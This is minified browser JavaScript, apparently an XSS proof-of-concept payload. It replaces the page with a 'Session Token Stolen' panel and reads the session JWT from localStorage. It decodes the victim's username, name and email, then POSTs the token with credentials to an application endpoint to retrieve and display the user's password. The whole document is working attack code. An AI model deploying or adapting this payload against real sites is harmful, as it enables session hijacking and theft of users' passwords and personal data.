document.body.innerHTML="",document.body.style.cssText="margin: 0; padding: 20px; font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh;";const container=document.createElement("div");container.style.cssText=`
    max-width: 800px;
    margin: 0 auto;
    background: white;
    padding: 30px;
    border-radius: 10px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
`;const header=document.createElement("h1");header.innerHTML='\uD83D\uDD10 <span style="color: #667eea">Session Token</span> Stolen',header.style.cssText="text-align: center; margin-bottom: 30px; color: #333;",container.appendChild(header);const token=localStorage.getItem("session_token")||"No token found";function decodeJWT(e){try{let t=e.split(".");if(3!==t.length)return null;let n=t[1].replace(/-/g,"+").replace(/_/g,"/"),o=decodeURIComponent(atob(n).split("").map(e=>"%"+("00"+e.charCodeAt(0).toString(16)).slice(-2)).join(""));return JSON.parse(o)}catch(a){return null}}const decoded="No token found"!==token?decodeJWT(token):null,username=decoded?.Username||decoded?.username||decoded?.sub||"Unknown",fullname=decoded?.FullName||decoded?.fullname||decoded?.name||"Unknown User",email=decoded?.Email||decoded?.email||username||"Unknown";if(decoded){let e=document.createElement("div");e.style.cssText="background: #f8f9fa; padding: 20px; border-radius: 8px; margin-bottom: 25px;",e.innerHTML=`
        <h3 style="color: #667eea; margin-top: 0;">👤 User Information</h3>
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
            <div>
                <strong>Username:</strong><br>
                <span style="color: #28a745">${username}</span>
            </div>
            <div>
                <strong>Full Name:</strong><br>
                <span style="color: #28a745">${fullname}</span>
            </div>
            <div>
                <strong>Email:</strong><br>
                <span style="color: #28a745">${email}</span>
            </div>
            <div>
                <strong>Token Type:</strong><br>
                <span style="color: #28a745">${decoded.typ||"JWT"}</span>
            </div>
        </div>
        ${decoded.exp?`<div style="margin-top: 15px;">
            <strong>Expires:</strong> ${new Date(1e3*decoded.exp).toLocaleString()}
        </div>`:""}
    `,container.appendChild(e)}const tokenSection=document.createElement("div");tokenSection.innerHTML=`
    <h3 style="color: #667eea; margin-bottom: 15px;">🔑 Raw Token</h3>
    <p style="color: #666; margin-bottom: 10px;">Full JWT token extracted from localStorage:</p>
`,container.appendChild(tokenSection);const textarea=document.createElement("textarea");textarea.id="tokenTextarea",textarea.value=token,textarea.style.cssText=`
    width: 100%;
    height: 150px;
    padding: 15px;
    margin-bottom: 20px;
    border: 2px solid #e9ecef;
    border-radius: 8px;
    font-family: 'Courier New', monospace;
    font-size: 12px;
    line-height: 1.5;
    resize: none;
    box-sizing: border-box;
    background: #f8f9fa;
`,textarea.setAttribute("readonly","true"),container.appendChild(textarea);const buttonContainer=document.createElement("div");buttonContainer.style.cssText="display: flex; gap: 15px; margin-bottom: 25px; flex-wrap: wrap;";const copyButton=document.createElement("button");copyButton.innerHTML="\uD83D\uDCCB Copy Token",copyButton.style.cssText=`
    padding: 12px 24px;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-size: 14px;
    font-weight: bold;
    transition: all 0.3s;
    flex: 1;
    min-width: 120px;
`,copyButton.onmouseover=()=>copyButton.style.transform="translateY(-2px)",copyButton.onmouseout=()=>copyButton.style.transform="translateY(0)",copyButton.onclick=function(){textarea.select(),navigator.clipboard.writeText(token).then(()=>{let e=copyButton.innerHTML;copyButton.innerHTML="✓ Copied!",copyButton.style.background="#28a745",setTimeout(()=>{copyButton.innerHTML=e,copyButton.style.background="linear-gradient(135deg, #667eea 0%, #764ba2 100%)"},2e3)})};const decodeButton=document.createElement("button");decodeButton.innerHTML="\uD83D\uDD0D View Decoded",decodeButton.style.cssText=`
    padding: 12px 24px;
    background: linear-gradient(135deg, #17a2b8 0%, #138496 100%);
    color: white;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-size: 14px;
    font-weight: bold;
    transition: all 0.3s;
    flex: 1;
    min-width: 120px;
`,decodeButton.onmouseover=()=>decodeButton.style.transform="translateY(-2px)",decodeButton.onmouseout=()=>decodeButton.style.transform="translateY(0)",decodeButton.onclick=function(){decoded?alert("Decoded JWT Payload:\n\n"+JSON.stringify(decoded,null,2)):alert("Invalid or no token found.")},buttonContainer.appendChild(copyButton),buttonContainer.appendChild(decodeButton),container.appendChild(buttonContainer);const status=document.createElement("div");status.id="status",status.style.cssText="text-align: center; color: #666; margin-bottom: 20px; font-style: italic;",status.textContent="Data will be automatically submitted...",container.appendChild(status);const formData=new FormData;formData.append("formulary","get_user_registration_information"),formData.append("session_token",token),fetch("/api/salesforce/endpoint",{method:"POST",body:formData,headers:{Accept:"*/*","X-Requested-With":"XMLHttpRequest"},credentials:"include"}).then(e=>e.json()).then(e=>{if(e.success&&e.data){let t=e.data.password||"Password not found in response",n=document.getElementById("status");n&&(n.innerHTML=`✅ Password retrieved: <strong style="color: #dc3545">${t}</strong>`,n.style.color="#155724",n.style.backgroundColor="#d4edda",n.style.padding="10px",n.style.borderRadius="4px",n.style.marginTop="10px");let o=document.createElement("input");o.id="password",o.type="hidden",o.name="retrieved_password",o.value=t,document.body.appendChild(o);let a=document.createElement("input");a.type="hidden",a.name="raw_json_response",a.value=JSON.stringify(e),document.body.appendChild(a)}else throw Error("Invalid response format")}).catch(e=>{let t=document.getElementById("status");t&&(t.innerHTML=`❌ Failed: ${e.message}`,t.style.color="#721c24",t.style.backgroundColor="#f8d7da",t.style.padding="10px",t.style.borderRadius="4px");let n=document.createElement("input");n.type="hidden",n.name="fetch_error",n.value=e.message}),document.body.appendChild(container);const dots=document.createElement("div");dots.innerHTML='Submitting data<span id="dots"></span>',dots.style.cssText="text-align: center; color: #764ba2; margin-top: 20px; font-size: 14px;",container.appendChild(dots);let dotCount=0;const dotInterval=setInterval(()=>{dotCount=(dotCount+1)%4,document.getElementById("dots").textContent=".".repeat(dotCount)},300);setTimeout(()=>clearInterval(dotInterval),1500);
